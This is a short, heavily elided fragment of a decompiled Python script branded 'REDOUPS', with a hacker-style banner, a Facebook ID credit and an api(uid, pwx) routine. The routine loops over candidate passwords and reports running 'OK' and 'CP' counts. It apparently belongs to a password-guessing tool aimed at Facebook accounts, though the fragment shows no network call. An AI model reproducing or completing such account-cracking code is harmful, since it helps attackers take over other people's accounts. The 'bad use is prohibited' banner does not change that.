# Decompile by : REDOUPS
 ...
 \033[0;91m ..###..###..####.##....##.####.........##....##.####.##....##..######.. 
  ...
  > \033[0;96mDEVELOPER     : REDOUPSHACK
  > \033[0;96mFACEBOOK ID   : RED OUPS HACK
  ...
  > \033[0;96mWARNING       : BAD USE IS PROHIBITED       
     """) 
         ...
         def api(self, uid, pwx): 
                 ...
                 sys.stdout.write( 
                         "\r\r %s[>_] [REDOUPS] : %s/%s -> \033[0;92m [ REDOUPS-OK:%s ]- \033[0;93m[REDOUPS-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp)) 
                 ); sys.stdout.flush() 
                 for pw in pwx: 
                         pw = pw.lower() 
